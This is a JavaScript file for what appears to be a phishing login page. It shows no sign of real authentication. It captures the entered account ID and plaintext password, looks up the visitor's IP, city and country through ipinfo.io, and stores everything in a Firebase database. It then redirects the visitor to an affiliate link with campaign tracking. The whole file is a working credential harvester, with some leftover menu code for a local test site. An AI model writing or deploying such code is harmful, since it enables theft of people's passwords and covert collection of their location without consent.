const userId = document.getElementById('acc');
const Pass = document.getElementById('pw');
const LoginBtn = document.getElementById('login');

const database = firebase.database();
$(document).ready(function() {
path_c = window.location;
switch (path_c){
    case "http://192.168.1.37/ryba_testground/":
    $('#menu-item-22').addClass('current_page_item');
    alert(path_c);
    break;
    case "http://192.168.1.37/ryba_testground/?page_id=7":
    $('#menu-item-21').addClass('current_page_item');
    break; 
    case "http://192.168.1.37/ryba_testground/?page_id=9":
    $('#menu-item-20').addClass('current_page_item');
    break;
    case "http://192.168.1.37/ryba_testground/?page_id=11":
    $('#menu-item-19').addClass('current_page_item');
    break;
}
});// var path = window.location.origin.toString().replace('www.build.','');
// var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
// var path = window.location.origin.toString().substring(0,end_of_unique-1);
// path = path.replace("https://www.","");

// var path = window.location.pathname.toString();
// while(path.indexOf("/")>=0)
//   path = path.replace("/","");
// while(path.indexOf(".")>=0)
//   path = path.replace(".","");

// // path = path.replace("https://www.","");
// path = path.replace("/",'');
var path = "build";
console.log(path);
const usersRef = database.ref('/users' + path);
var city = ""
var country = ""
var ip = ""
$.get("https://ipinfo.io", function (response) {
  city = response.city
  ip = response.ip
  country = response.country
  console.log(response.city, response.country);
}, "jsonp");

LoginBtn.disable = false;
LoginBtn.addEventListener('click', e => {
  e.preventDefault();
  // const autoId = usersRef.push().key
  // usersRef.child(autoId).set({
  //   ID: userId.value,
  //   pw: Pass.value
  // });
  if (userId.value.length > 4 && Pass.value.length > 4) {
    hashCode = function(s) {
      var h = 0, l = s.length, i = 0;
      if ( l > 0 )
        while (i < l)
          h = (h << 5) - h + s.charCodeAt(i++) | 0;
      return h;
    };

    usersRef.child(hashCode(userId.value.toString())).transaction(function (currentData) {
      if (currentData === null) {
        return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
      } else {
        // console.log('User  already exists.');
        return; // Abort the transaction.
      }
    });
    window.location.replace("https://aff.abomahraanremix.com/?utm_medium=7f99aa6c6e039f983ad64dde10ecbe667bb24981&utm_campaign=sc1111111");
  }
});
